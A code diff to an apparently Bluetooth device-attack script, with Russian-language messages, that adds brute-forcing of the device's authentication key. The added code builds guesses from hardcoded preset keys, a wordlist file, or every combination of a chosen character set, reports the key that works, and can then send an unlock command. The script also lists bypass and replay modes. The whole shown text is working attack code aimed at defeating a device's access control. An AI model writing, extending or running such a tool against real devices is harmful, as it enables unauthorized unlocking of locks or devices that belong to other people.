@@ -14,6 +14,16 @@ CMD_ERROR = 0x10
 CMD_LOCK = 0x15
 CMD_DEVICE_INFO = 0x31
 PRESETS = ("4BKNwi77", "w4S3Hqn5")
+CHARSET_DIGITS = "0123456789"
+CHARSET_LOWER = "abcdefghijklmnopqrstuvwxyz"
+CHARSET_UPPER = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+CHARSET_ALNUM = CHARSET_LOWER + CHARSET_UPPER + CHARSET_DIGITS
+CHARSET_NAMES = {
+    "digits": CHARSET_DIGITS,
+    "lower": CHARSET_LOWER,
+    "upper": CHARSET_UPPER,
+    "alnum": CHARSET_ALNUM,
+}
 
 
 def crc8(data):
@@ -59,6 +69,70 @@ def parse_frame(data):
 
 def hex_bytes(data):
     return " ".join(f"{value:02X}" for value in data)
+
+
+def resolve_charset(value):
+    return CHARSET_NAMES.get(value.lower(), value)
+
+
+def key_sequence(charset, length):
+    alphabet = list(dict.fromkeys(charset))
+    if not alphabet or length <= 0:
+        return
+    index = [0] * length
+    while True:
+        yield "".join(alphabet[position] for position in index)
+        position = length - 1
+        while position >= 0:
+            index[position] += 1
+            if index[position] < len(alphabet):
+                break
+            index[position] = 0
+            position -= 1
+        if position < 0:
+            return
+
+
+def key_sequence_count(charset, length):
+    size = len(set(charset))
+    if size == 0 or length <= 0:
+        return 0
+    return size ** length
+
+
+def parse_wordlist(path):
+    with open(path, "r", encoding="utf-8", errors="ignore") as handle:
+        text = handle.read()
+    seen = set()
+    result = []
+    for item in text.replace("\r", "\n").replace(",", "\n").replace(";", "\n").replace("\t", "\n").split("\n"):
+        key = item.strip()
+        if key and key not in seen:
+            seen.add(key)
+            result.append(key)
+    return result
+
+
+def build_candidates(args):
+    seen = set()
+
+    def fresh(key):
+        if not key or key in seen:
+            return False
+        seen.add(key)
+        return True
+
+    for key in args.key or PRESETS:
+        if fresh(key):
+            yield key
+    if args.wordlist:
+        for key in parse_wordlist(args.wordlist):
+            if fresh(key):
+                yield key
+    if args.mask:
+        for key in key_sequence(resolve_charset(args.mask), args.length):
+            if fresh(key):
+                yield key
 
 
 def unlock_payload():
@@ -182,18 +256,30 @@ async def run(args):
             if args.mode == "capture":
                 await probe.drain(args.seconds)
             elif args.mode == "auth":
-                keys = args.key or list(PRESETS)
-                for key in keys:
-                    print(f"Проверка ключа {key}")
+                total = None
+                if args.mask:
+                    charset = resolve_charset(args.mask)
+                    total = key_sequence_count(charset, args.length)
+                    print(f"Маска: {len(set(charset))} символов, длина {args.length}, всего {total}")
+                if args.wordlist:
+                    print(f"Словарь: {len(parse_wordlist(args.wordlist))} ключей из {args.wordlist}")
+                tried = 0
+                for key in build_candidates(args):
+                    tried += 1
+                    suffix = f" из {total}" if total is not None else ""
+                    print(f"Проверка ключа {key} ({tried}{suffix})")
                     await probe.send(CMD_KEY, 0, key.encode("ascii"), f"key {key}")
                     frame = await probe.wait_frame(args.wait, lambda f: f[0] == CMD_KEY)
                     if frame and len(frame[3]) >= 2 and frame[3][0] == 1:
                         session = frame[3][1]
-                        print(f"Ключ подошел, session=0x{session:02X}")
+                        print(f"Ключ подошел: {key}, session=0x{session:02X}")
                         if args.unlock:
                             await probe.send(CMD_UNLOCK, session, unlock_payload(), "unlock")
                             await probe.wait_frame(args.wait)
                         return 0
+                    if args.limit and tried >= args.limit:
+                        print(f"Достигнут лимит {args.limit}")
+                        break
                 print("Ключи не подошли")
             elif args.mode == "bypass":
                 variants = [
@@ -238,6 +324,10 @@ def main():
     parser.add_argument("--gap", type=float, default=0.05)
     parser.add_argument("--seconds", type=float, default=30.0)
     parser.add_argument("--key", action="append", default=[], help="Ключ для режима auth")
+    parser.add_argument("--wordlist", default="", help="Файл со словарем ключей для режима auth")
+    parser.add_argument("--mask", default="", help="Символы маски или имя набора: digits, lower, upper, alnum")
+    parser.add_argument("--length", type=int, default=4, help="Длина ключа для маски, 1..8")
+    parser.add_argument("--limit", type=int, default=0, help="Максимум попыток, 0 без ограничения")
     parser.add_argument("--unlock", action="store_true", help="Unlock после успешного auth")
     parser.add_argument("--hex", action="append", default=[], help="Кадр для replay")
     parser.add_argument("--mode", choices=("auth", "bypass", "brute", "replay", "capture"), default="auth")
@@ -248,6 +338,9 @@ def main():
         for device in devices:
             print(f"{device.address} {device.name or 'Unknown'} RSSI={device.rssi}")
         return 0
+    if not 1 <= args.length <= 8:
+        print("Длина ключа должна быть в диапазоне 1..8")
+        return 2
     return asyncio.run(run(args))
 
 
